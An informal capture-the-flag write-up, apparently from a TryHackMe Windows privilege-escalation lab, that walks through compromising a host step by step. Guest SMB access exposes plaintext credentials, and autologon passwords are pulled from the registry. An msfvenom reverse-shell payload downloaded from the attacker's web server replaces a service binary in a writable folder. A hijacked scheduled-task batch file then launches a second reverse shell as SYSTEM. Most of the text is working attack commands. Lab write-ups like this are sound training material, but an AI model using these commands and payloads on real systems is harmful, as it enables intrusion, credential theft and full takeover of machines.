ATTACKER: 10.114.74.200
TARGET: 10.114.163.96

`nmap -sS 10.114.163.96`
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server

`nmap -sC -sV -p 135,139,445,3389 10.114.163.96`

not much new information, let's proceed with port 445, which is SMB

trying guest access to list shares

`nxc smb 10.114.163.96 -u guest -p '' --shares`

we can read these two

```
IPC$ (remote IPC: inter-process communication)

Public (priority for now)
```

`smbclient //10.114.163.96/Public -U guest`

entering no password got us in

there is literally only one file

`get welcome.txt`

`exit`

`cat welcome.txt`

```
Username : thmuser
Password : Password1!
```

juicy!

`nxc smb 10.114.163.96 -u thmuser -p 'Password1!' --shares`

nothing more, so let's RDP in with thmuser

`remmina`

```
Server: 10.114.163.96
Username : thmuser
Password : Password1!
```

I first tried powershell, nothing at first

browsing through files, I went by a bunch of users to which I had no access, until finding thmuser

he had a flag on his desktop

check history: `Get-Content (Get-PSReadLineOption).HistorySavePath`

nothing

saved credentials?

`cmdkey /list`

nope

winlogon sometimes has "autologon" credentials

`reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"`
```
    AutoAdminLogon 1
    DefaultUserName notadmin
    DefaultPassword P@ssw0rd! 
```

let's verify the credentials:

`runas /user:notadmin cmd.exe`

yep, we are notadmin

we immediately went to his desktop and found a flag

now we will check the same stuff as with thmuser

we get nothing

also tried:
 database connection strings
 - `type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString`
 

okay, a little cheating, we know we are trying to jump to svcadmin, so I googled a command to find services

searching services running under bro:

`wmic service get Name,DisplayName,StartName|findstr /i svcadmin`

there was 1 (one) service - THMSvc - very sus

i tried `sc qc THMSvc` but it was forbidden. I had to exit from powershell with `cmd.exe`. Windows do be like that.

so... `sc qc THMSvc`

```
BINARY_PATH_NAME   : C:\Windows\THMSVC\svc.exe
DISPLAY_NAME       : THM Background Service
SERVICE_START_NAME : .\svcadmin 
```

the directory could have weak permissions, let's look at those:

`icacls C:\Windows\THMSvc`

the directory is writable by notadmin (us) aswell!!!

it is revshell o'clock

copied this classic from my Windows_Privilege_Escalation.md notes (cool notes btw):

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.114.74.200 LPORT=4445 -f exe-service -o svc.exe`

attacker:

`python3 -m http.server 8000`

target:

have to go back to powershell for wget

`powershell`

okay so for some reason, I had the exe in /root/svc.exe but wget didnt eat that path and worked with this (idk why):

`wget http://10.114.74.200:8000/svc.exe -O svc.exe`

i granted everyon full permissions, because i like to share

`icacls C:\Windows\THMSVC\svc.exe /grant Everyone:F`

I did the same mistake again...

I tried to start the service with `sc start THMSvc` in powershell, which just stood there silent, unphased and did not say anything....

go back to `cmd` and again `sc start THMSvc`, now we get the shell.

I was so excited I started typing `dior` instead of `dir`

got the flag though and let's go

next dude: SYSTEM

`wmic service get Name,DisplayName,StartName|findstr /i SYSTEM`

okay this won't work lol

what I want:

how to search for writable scheduled tasks where svcadmin has modify permission

I gave it to gemini ngl, bro was NOT helpful

`cd C:\Windows\Tasks\`

there was one weird task: cleanup.bat

`icacls C:\Windows\Tasks\cleanup.bat`

```
BUILTIN\Users:(I)(RX)
PRIVESC\svcadmin:(I)(M)
BUILTIN\Administrators:(I)(F)
NT AUTHORITY\SYSTEM:(I)(F)
```

we will do the same revshell with a different port

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.114.74.200 LPORT=4446 -f exe -o cleanup.exe`

attacker:

`python3 -m http.server 8000`

target:
`powershell`

`wget http://10.114.74.200:8000/cleanup.exe -O cleanup.exe`

we will replace cleanup.bat with contents of our cleanup.exe


`cmd /c "echo C:\Windows\Tasks\cleanup.exe > C:\Windows\Tasks\cleanup.bat"`

wait for the task to run, and we get SYSTEM

--the end--

ATTACKER: 10.114.74.200
TARGET: 10.114.163.96